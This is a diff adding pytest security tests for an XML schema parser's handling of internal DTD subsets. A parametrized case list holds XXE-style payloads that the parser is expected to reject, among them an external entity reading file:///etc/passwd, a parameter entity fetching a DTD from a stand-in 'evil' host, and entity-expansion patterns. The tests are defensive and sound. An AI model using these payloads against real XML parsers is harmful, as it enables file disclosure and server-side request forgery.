@@ -83,3 +83,44 @@ class TestSsrfProtection:
             sec_module.settings = config_module.settings
             with pytest.raises(SecurityError, match="only http"):
                 fetch_schema_url("file:///etc/passwd")
+
+
+class TestInternalDtdSubset:
+    """A bounded internal subset of literal entities is allowed (W3C xmldsig)."""
+
+    XS = b'<xs:schema xmlns:xs="http://www.w3.org/2001/XMLSchema" targetNamespace="&a;"/>'
+
+    def test_w3c_xmldsig_schema_loads(self, xmldsig_bytes: bytes) -> None:
+        model = parse_single(xmldsig_bytes, "xmldsig-core-schema.xsd")
+        assert model.target_namespace == "http://www.w3.org/2000/09/xmldsig#"
+        assert any(e.name == "Signature" for e in model.elements)
+
+    def test_literal_entity_expanded(self) -> None:
+        data = b'<!DOCTYPE schema [<!ENTITY a "urn:x">]>' + self.XS
+        tree = parse_bytes(data, "s.xsd")
+        assert tree.getroot().get("targetNamespace") == "urn:x"
+
+    def test_external_dtd_is_never_loaded(self) -> None:
+        data = b'<!DOCTYPE schema SYSTEM "file:///etc/passwd" [<!ENTITY a "urn:x">]>' + self.XS
+        assert parse_bytes(data, "s.xsd").getroot().get("targetNamespace") == "urn:x"
+
+    @pytest.mark.parametrize(
+        "subset",
+        [
+            b'<!ENTITY a SYSTEM "file:///etc/passwd">',
+            b'<!ENTITY % p SYSTEM "http://evil/x.dtd"> %p;',
+            b'<!ENTITY a "&b;"><!ENTITY b "x">',
+            b'<!ENTITY a "<xs:element/>">',
+            b"<!ELEMENT a ANY>",
+            b"<!NOTATION n SYSTEM 'x'>",
+            b'<!ENTITY a "' + b"x" * 600 + b'">',
+            b"".join(b'<!ENTITY e%d "v">' % i for i in range(33)),
+        ],
+    )
+    def test_unsafe_subsets_rejected(self, subset: bytes) -> None:
+        with pytest.raises(SecurityError, match="DTD"):
+            parse_bytes(b"<!DOCTYPE schema [" + subset + b"]>" + self.XS, "s.xsd")
+
+    def test_entity_declaration_outside_doctype_rejected(self) -> None:
+        with pytest.raises(SecurityError):
+            parse_bytes(self.XS + b'<!ENTITY a "x">', "s.xsd")
